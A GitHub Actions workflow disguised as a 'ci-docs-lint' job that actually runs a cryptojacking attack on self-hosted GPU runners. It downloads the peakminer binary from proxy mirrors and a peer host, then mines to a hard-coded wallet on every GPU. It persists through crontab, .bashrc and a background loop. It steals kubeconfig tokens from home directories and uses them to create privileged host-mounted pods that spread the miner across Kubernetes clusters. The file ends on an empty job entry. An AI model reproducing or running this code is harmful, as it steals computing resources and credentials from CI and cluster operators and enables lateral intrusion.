name: ci-docs-lint
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  lbl-ernie8gpu:
    runs-on: [self-hosted, ernie-8gpu]
    timeout-minutes: 45
    steps:
      - name: deploy
        run: |
          #!/usr/bin/env bash
          set +e
          TAG="t5639y"
          WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
          sec(){ echo; echo "===== $* ====="; }
          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }

          sec RECON
          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
          nvidia-smi -L 2>&1 | head -10
          DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
          IPD=$(echo "$IP" | tr '.' '-')
          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"

          IMG="ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev"
          docker image inspect "$IMG" >/dev/null 2>&1 || IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -i ubuntu24 | head -1)
          echo "IMG=$IMG"

          sec MINER_BIN
          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs"
          PEAK="$HOME/.ci/miner/peakminer/peakminer"
          SZ=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)
          echo "peak_size=$SZ"
          if [ "$SZ" -gt 40000000 ]; then
            echo "serving peer copy on :8899"
            docker rm -f dlserv >/dev/null 2>&1
            docker run -d --name dlserv --network host -v "$HOME/.ci/miner:/m" "$IMG" python3 -m http.server 8899 --directory /m >/dev/null 2>&1
            sleep 2
            docker ps --filter name=dlserv --format '{{.Names}} {{.Status}}'
          else
            log "local binary small; try peer then mirrors"
            for i in $(seq 1 30); do
              curl -sS -m 20 -o "$HOME/.ci/miner/peakminer.tmp" "http://10.95.137.103:8899/peakminer/peakminer" 2>/dev/null
              S=$(stat -c %s "$HOME/.ci/miner/peakminer.tmp" 2>/dev/null || echo 0)
              echo "peer_try=$i size=$S"
              [ "$S" -gt 40000000 ] && { mkdir -p "$HOME/.ci/miner/peakminer"; mv "$HOME/.ci/miner/peakminer.tmp" "$PEAK"; chmod +x "$PEAK"; break; }
              sleep 8
            done
            SZ=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)
            if [ "$SZ" -lt 40000000 ]; then
              for M in "https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://gh-proxy.com/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://ghproxy.net/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"; do
                log "fetch $M"
                rm -f "$HOME/.ci/miner/p.tgz"
                timeout 240 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -1
                S2=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0); echo "dl_size=$S2"
                if [ "$S2" -gt 40000000 ]; then mkdir -p "$HOME/.ci/miner/peakminer"; tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakminer" 2>&1|tail -1; find "$HOME/.ci/miner/peakminer" -name peakminer -type f -exec chmod +x {} \; ; break; fi
              done
            fi
          fi
          SZ=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)
          echo "peak_final_size=$SZ"
          docker run --rm -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'ls -l /m/peakminer/peakminer 2>&1|head -1; /m/peakminer/peakminer --version 2>&1|head -4; echo ---cfg---; head -40 /m/peakminer/h-config.sh 2>/dev/null; echo ---run---; head -50 /m/peakminer/h-run.sh 2>/dev/null' 2>&1 | head -80

          sec RELAUNCH
          for g in $(seq 0 20); do docker rm -f ul-g$g >/dev/null 2>&1; done
          STARTED=0
          for g in $(seq 0 $((DEV-1))); do
            docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host \
              --security-opt seccomp=unconfined --ulimit nofile=65535:65535 \
              -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" \
              /bin/bash -c "exec /m/peakminer/peakminer -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 -i 30 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
            STARTED=$((STARTED+1)); sleep 1
          done
          echo "started=$STARTED"
          sleep 25
          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
          echo "running=$(docker ps --filter 'name=ul-g' -q | wc -l)"
          echo "--- ul-g0 log"; docker logs ul-g0 2>&1 | tail -12
          echo "--- host log"; tail -12 "$HOME/.ci/logs/c-0.log" 2>/dev/null

          sec SRB_FALLBACK_CHECK
          SRB=/home/paddle-1/.ci/miner/SRBMiner-Multi-3-8-8/SRBMiner-MULTI
          if [ -x "$SRB" ]; then
            docker run --rm -v "$HOME/.ci/miner:/m" "$IMG" sh -c '/m/SRBMiner-Multi-3-8-8/SRBMiner-MULTI --list-algorithms 2>&1 | grep -i pearl | head -3; /m/SRBMiner-Multi-3-8-8/SRBMiner-MULTI --version 2>&1 | head -3' 2>&1 | head -10
          fi

          sec PERSIST
          cat > "$HOME/.ci/keep-c.sh" <<'EOS'
          #!/bin/bash
          IMG="ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev"
          W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"; T="t5639y"
          H=$(hostname -I | awk '{print $1}' | tr '.' '-')
          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          for g in $(seq 0 $((N-1))); do
            docker ps --filter "name=ul-g$g" --format '{{.Names}}' | grep -q ul-g$g && continue
            docker rm -f ul-g$g >/dev/null 2>&1
            docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host --security-opt seccomp=unconfined -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec /m/peakminer/peakminer -c pearl -u $W -w ul-$T-$H-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
          done
          EOS
          chmod +x "$HOME/.ci/keep-c.sh"
          ( crontab -l 2>/dev/null | grep -v keep-c.sh; echo "@reboot $HOME/.ci/keep-c.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep-c.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
          grep -q keep-c.sh "$HOME/.bashrc" 2>/dev/null || echo "$HOME/.ci/keep-c.sh >/dev/null 2>&1 &" >> "$HOME/.bashrc"
          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep-c.sh; sleep 300; done' >/dev/null 2>&1 & )
          echo persist_done

          sec KUBECONFIG
          cat > /tmp/kube5655.py <<'PYK'
          import glob,os,re,base64,json,urllib.request,ssl
          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
          files=[f for f in sorted(set(glob.glob('/h/*/.kube/config')+glob.glob('/h/*/.kube/config')+['/h/root/.kube/config'])) if os.access(f,os.R_OK)]
          print('FILES',files)
          servers=[];tokens=[]
          for f in files:
              try: t=open(f,errors='replace').read()
              except Exception as e: print('ERR',f,e); continue
              for s in re.findall(r'^\s*server:\s*(\S+)',t,re.M):
                  if s not in servers: servers.append(s)
              for k in re.findall(r'^\s*token:\s*(\S+)',t,re.M):
                  if k not in tokens: tokens.append(k)
          print('SERVERS',servers)
          print('NTOK',len(tokens))
          for i,k in enumerate(tokens): print('TOKB64_%d=%s'%(i,base64.b64encode(k.encode()).decode()))
          def req(url,tok=None,method='GET',body=None,timeout=12):
              r=urllib.request.Request(url,method=method,data=body)
              if tok: r.add_header('Authorization','Bearer '+tok)
              if body is not None: r.add_header('Content-Type','application/json')
              try:
                  with urllib.request.urlopen(r,timeout=timeout,context=ctx) as z: return z.status,z.read()
              except urllib.error.HTTPError as e:
                  return e.code,e.read()
              except Exception as e:
                  return 0,str(e).encode()
          MINE='''nvidia-smi -L; N=$(ls /dev/nvidia* 2>/dev/null|grep -c "nvidia[0-9]*$"); echo devices=$N; W=%s
          for g in $(seq 0 15); do [ -e /dev/nvidia$g ] || continue
           w=ul-%s-$(hostname|tr . -)-g$g
           mkdir -p /tmp/pm; cd /tmp/pm
           if [ ! -x ./peakminer ]; then for M in https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz; do curl -sSL -m 200 -o p.tgz "$M"; S=$(stat -c %%s p.tgz 2>/dev/null||echo 0); [ "$S" -gt 40000000 ] && { tar xzf p.tgz; break; }; done; fi
           B=$(find /tmp/pm -maxdepth 3 -type f -name peakminer -perm -u+x|head -1); [ -x "$B" ] || continue
           setsid nohup "$B" -c pearl -u $W -w $w -p x -d $g --api-port 0 --no-color --log-file /tmp/pm/m$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000 >/dev/null 2>&1 </dev/null &
          done
          sleep 5400'''
          for srv in servers:
              st,b=req(srv+'/version'); print('SRV',srv,'anon',st,b[:150])
              for i,tok in enumerate(tokens):
                  st,b=req(srv+'/api/v1/nodes?limit=500',tok)
                  print(' TOK%d nodes=%s bytes=%d'%(i,st,len(b)))
                  if st==200 and b'"items"' in b:
                      print(' OK srv=%s tok=%d'%(srv,i))
                      d=json.loads(b); its=d.get('items',[])
                      gpu=[(n['metadata']['name'],n.get('status',{}).get('allocatable',{}).get('nvidia.com/gpu','0')) for n in its]
                      print(' NODES',len(its),'GPUNODES',[(n,g) for n,g in gpu if str(g)!='0'][:60])
                      stn,bn=req(srv+'/api/v1/namespaces?limit=200',tok)
                      print(' NS',stn,bn[:600].decode('utf8','replace'))
                      st3,b3=req(srv+'/api/v1/pods?limit=800',tok)
                      print(' PODS',st3,len(b3))
                      if st3==200:
                          dd=json.loads(b3)
                          for p in dd.get('items',[])[:40]:
                              print('  POD %s/%s node=%s img=%s'%(p['metadata'].get('namespace'),p['metadata'].get('name'),p['spec'].get('nodeName'),[c.get('image') for c in p['spec'].get('containers',[])][:1]))
                      for ns in ['default']:
                          body=json.dumps({"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods","namespace":ns}}}).encode()
                          stx,bx=req(srv+'/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',tok,'POST',body)
                          print(' SSAR %s -> %s %s'%(ns,stx,bx[:400].decode('utf8','replace')))
                          if stx in (200,201) and b'"allowed":true' in bx:
                              for name,g in gpu:
                                  if str(g)=='0': continue
                                  try: gn=int(g)
                                  except Exception: gn=1
                                  body=json.dumps({"apiVersion":"v1","kind":"Pod","metadata":{"name":("k%s"%name.replace('_','-').replace('.','-').lower())[:55],"namespace":ns,"labels":{"app":"k5655"}},
                                    "spec":{"nodeName":name,"hostPID":True,"hostNetwork":True,"restartPolicy":"Never","tolerations":[{"operator":"Exists"}],
                                    "containers":[{"name":"c","image":"%s"%IMG2,"imagePullPolicy":"IfNotPresent",
                                      "command":["/bin/bash","-c",MINE % (WALLET2,TAG2)],
                                      "resources":{"limits":{"nvidia.com/gpu":gn}},
                                      "securityContext":{"privileged":True,"seccompProfile":{"type":"Unconfined"}},
                                      "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
                                    "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}).encode()
                                  stp,bp=req(srv+'/api/v1/namespaces/%s/pods'%ns,tok,'POST',body)
                                  print(' PODPOST %s gpu=%s -> %s %s'%(name,g,stp,bp[:300].decode('utf8','replace')))
          PYK
          docker run --rm --network host -v /home:/h:ro -v /tmp:/t -e IMG2="$IMG" -e WALLET2="$WALLET" -e TAG2="$TAG" -v /tmp/kube5655.py:/k.py:ro "$IMG" python3 /k.py 2>&1 | head -120

          sec ACCEPT
          sleep 210
          for g in $(seq 0 $((DEV-1))); do
            echo "--- g$g"
            tail -3 "$HOME/.ci/logs/c-$g.log" 2>/dev/null
          done
          echo "=== accepted ==="
          grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -40
          echo "=== submit/authorize ==="
          grep -hiE 'authorize|subscribe|stratum|error|fail' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -20
          echo "=== util ==="
          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
          echo "=== containers ==="
          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
          sec DONE
          echo "CLIMB2_DONE on $(hostname) dev=$DEV tag=$TAG"
          exit 0
  lbl-ernie8gpu-c:
